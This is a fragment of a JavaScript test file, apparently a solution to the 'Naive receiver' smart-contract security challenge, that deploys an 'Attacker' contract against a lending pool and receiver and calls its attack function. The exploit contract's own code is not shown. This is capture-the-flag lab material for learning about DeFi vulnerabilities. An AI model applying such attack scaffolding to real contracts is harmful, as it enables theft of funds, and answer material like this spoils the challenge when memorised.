...
describe("[Challenge] Naive receiver", function () {
  ...
  it("Execution", async function () {
    ...
    let attack = await ethers.getContractFactory("Attacker", player);
    let attack_contract = await attack.deploy(pool.address, receiver.address);
    let player_attackConnected = await attack_contract.connect(player);
    let attackTX = player_attackConnected.attack();
  });
